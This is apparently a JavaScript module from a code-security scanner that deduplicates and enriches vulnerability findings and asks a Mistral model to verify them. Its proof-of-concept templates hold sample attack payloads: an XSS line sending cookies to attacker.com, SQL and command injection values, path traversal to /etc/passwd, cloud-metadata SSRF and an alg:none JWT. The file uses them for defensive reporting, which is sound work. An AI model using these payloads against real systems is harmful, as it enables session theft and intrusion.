'use strict';

/**
 * VERIFIER AGENT — GitHub variant
 * Deduplicates, enriches, and LLM-verifies findings.
 * Uses server's @mistralai/mistralai client.
 */

const { Mistral } = require('@mistralai/mistralai');

const POC_TEMPLATES = {
  'SQL Injection': (f) => ({
    poc: `curl -X POST <endpoint> -d '{"${f.param || 'id'}": "1\\'--"}'`,
    risk: 'Authentication bypass, full DB dump',
  }),
  'XSS': () => ({
    poc: `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`,
    risk: 'Session hijacking, credential theft',
  }),
  'Command Injection': () => ({
    poc: `{"host": "127.0.0.1; id"}`,
    risk: 'Full Remote Code Execution',
  }),
  'Path Traversal': () => ({
    poc: `GET /api/files?path=../../etc/passwd`,
    risk: 'Read arbitrary files including credentials',
  }),
  'SSRF': () => ({
    poc: `GET /api/proxy?url=http://169.254.169.254/latest/meta-data/`,
    risk: 'Access internal network, cloud metadata',
  }),
  'Broken Authentication': () => ({
    poc: `JWT with alg:none — eyJhbGciOiJub25lIn0.eyJpZCI6MX0.`,
    risk: 'Authenticate as any user without password',
  }),
  'Hardcoded Secret': (f) => ({
    poc: `The ${f.name || 'credential'} is visible in source code`,
    risk: 'Anyone with repo access can use these credentials',
  }),
  'IDOR': () => ({
    poc: `GET /api/users/1 (as user ID 2) — returns victim data`,
    risk: 'Access any user account data',
  }),
  'Prototype Pollution': () => ({
    poc: `{"__proto__": {"isAdmin": true}}`,
    risk: 'Privilege escalation, bypass security checks',
  }),
  'Open Redirect': () => ({
    poc: `GET /api/redirect?to=https://evil.com`,
    risk: 'Phishing attacks using trusted domain',
  }),
};

const FIX_TEMPLATES = {
  'SQL Injection':       'Use parameterized queries: db.prepare("SELECT * FROM users WHERE id = ?").get(id)',
  'XSS':                 'Sanitize output with DOMPurify. Never use dangerouslySetInnerHTML with user input.',
  'Command Injection':   'Never pass user input to exec(). Use spawn() with array args.',
  'Path Traversal':      'Validate paths: const safe = path.resolve(base, input); if (!safe.startsWith(base)) throw 403;',
  'SSRF':                'Validate URLs against allowlist. Block internal IPs (10.x, 172.16.x, 192.168.x, 169.254.x).',
  'Broken Authentication': 'Use jwt.verify() with explicit algorithms: ["HS256"]. Never allow alg:none.',
  'Hardcoded Secret':    'Move all secrets to environment variables. Use a secrets manager.',
  'IDOR':                'Check ownership: if (resource.userId !== req.user.id) return res.status(403).json({});',
  'Prototype Pollution': 'Use Object.create(null) or structuredClone() instead of _.merge() with user data.',
  'Open Redirect':       'Validate redirect URLs against an allowlist of trusted domains.',
  'Mass Assignment':     'Explicitly whitelist fields: const { name, email } = req.body;',
};

class VerifierAgent {
  constructor(apiKey, model, logger) {
    this.name   = 'VerifierAgent';
    this.logger = logger || console.log;
    this.client = new Mistral({ apiKey: apiKey || process.env.MISTRAL_API_KEY });
    this.model  = model || 'mistral-large-latest';
  }

  log(msg) { this.logger(`[VerifierAgent] ${msg}`); }

  deduplicate(allFindings) {
    const seen   = new Map();
    const unique = [];
    for (const f of allFindings) {
      const key = `${f.file || ''}:${f.line || 0}:${(f.category || f.name || '').toLowerCase()}`;
      if (!seen.has(key)) {
        seen.set(key, true);
        unique.push(f);
      } else {
        const existing = unique.find((u) =>
          `${u.file || ''}:${u.line || 0}:${(u.category || u.name || '').toLowerCase()}` === key
        );
        if (existing) {
          const ord = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 };
          if ((ord[f.severity] ?? 5) < (ord[existing.severity] ?? 5)) existing.severity = f.severity;
          if (f.poc  && !existing.poc)  existing.poc  = f.poc;
          if (f.fix  && !existing.fix)  existing.fix  = f.fix;
        }
      }
    }
    return unique;
  }

  enrich(finding) {
    const cat      = finding.category || finding.name || '';
    const template = POC_TEMPLATES[cat];
    const fixTmpl  = FIX_TEMPLATES[cat];

    if (template && !finding.poc) {
      const poc = template(finding);
      finding.poc = poc.poc || '';
    }
    if (fixTmpl && !finding.fix) finding.fix = fixTmpl;

    const hasLine    = finding.line > 0          ? 20 : 0;
    const hasSnippet = finding.snippet            ? 20 : 0;
    const hasPoc     = finding.poc               ? 20 : 0;
    const hasCwe     = finding.cwe               ? 20 : 0;
    const fromLlm    = finding.source === 'LLM Analysis' ? 20 : 0;
    finding.confidence      = hasLine + hasSnippet + hasPoc + hasCwe + fromLlm;
    finding.confidenceLabel = finding.confidence >= 80 ? 'High' : finding.confidence >= 50 ? 'Medium' : 'Low';

    return finding;
  }

  async llmVerify(findings, fileContents) {
    if (findings.length === 0) return findings;

    const summary = findings.slice(0, 10).map((f, i) =>
      `${i + 1}. [${f.severity}] ${f.category} in ${(f.file || '').split(/[\\/]/).pop()}:${f.line} — "${f.description}"`
    ).join('\n');

    const relevantCode = (fileContents || [])
      .filter((fc) => findings.some((f) => f.file === fc.filePath))
      .slice(0, 3)
      .map((fc) => `### ${fc.filePath}\n${fc.content.slice(0, 2000)}`)
      .join('\n\n');

    const prompt = `Review these security findings and confirm true positives, add exploit PoCs and exact fixes.

Findings:
${summary}

Relevant code:
${relevantCode}

Return as JSON array with same fields plus "verified": true/false and updated "poc" and "fix".`;

    try {
      const response = await this.client.chat.complete({
        model: this.model,
        messages: [
          { role: 'system', content: 'You are a security expert verifying vulnerability findings. Be precise.' },
          { role: 'user',   content: prompt },
        ],
        temperature: 0.1,
        maxTokens:   2048,
      });

      const text = response.choices[0]?.message?.content || '';
      const match = text.match(/\[[\s\S]*\]/);
      if (match) {
        const verified = JSON.parse(match[0]);
        for (let i = 0; i < Math.min(findings.length, verified.length); i++) {
          if (verified[i].poc) findings[i].poc = verified[i].poc;
          if (verified[i].fix) findings[i].fix = verified[i].fix;
          findings[i].verified = verified[i].verified !== false;
        }
      }
    } catch (e) {
      this.log(`LLM verification error: ${e.message}`);
    }
    return findings;
  }

  async run(patternResults, llmResults, scannerResult) {
    const t0 = Date.now();
    this.log('Starting verification and enrichment...');

    const allRaw = [
      ...(patternResults.patternFindings || []),
      ...(patternResults.secretFindings  || []),
      ...(patternResults.astFindings     || []),
      ...(patternResults.depFindings     || []),
      ...(llmResults.llmFindings         || []),
    ];

    this.log(`Total raw findings: ${allRaw.length}, deduplicating...`);
    const unique   = this.deduplicate(allRaw);
    this.log(`After dedup: ${unique.length} unique findings`);

    const enriched     = unique.map((f) => this.enrich(f));
    const criticalHigh = enriched.filter((f) => ['CRITICAL', 'HIGH'].includes(f.severity)).slice(0, 15);

    if (criticalHigh.length > 0) {
      this.log(`LLM verifying ${criticalHigh.length} critical/high findings...`);
      await this.llmVerify(criticalHigh, scannerResult.allFiles || []);
    }

    const elapsed = Date.now() - t0;
    this.log(`Verification done in ${elapsed}ms — ${enriched.length} findings`);

    return {
      verifiedFindings: enriched,
      stats: {
        total:    enriched.length,
        critical: enriched.filter((f) => f.severity === 'CRITICAL').length,
        high:     enriched.filter((f) => f.severity === 'HIGH').length,
        medium:   enriched.filter((f) => f.severity === 'MEDIUM').length,
        low:      enriched.filter((f) => f.severity === 'LOW').length,
        durationMs: elapsed,
      },
    };
  }
}

module.exports = VerifierAgent;
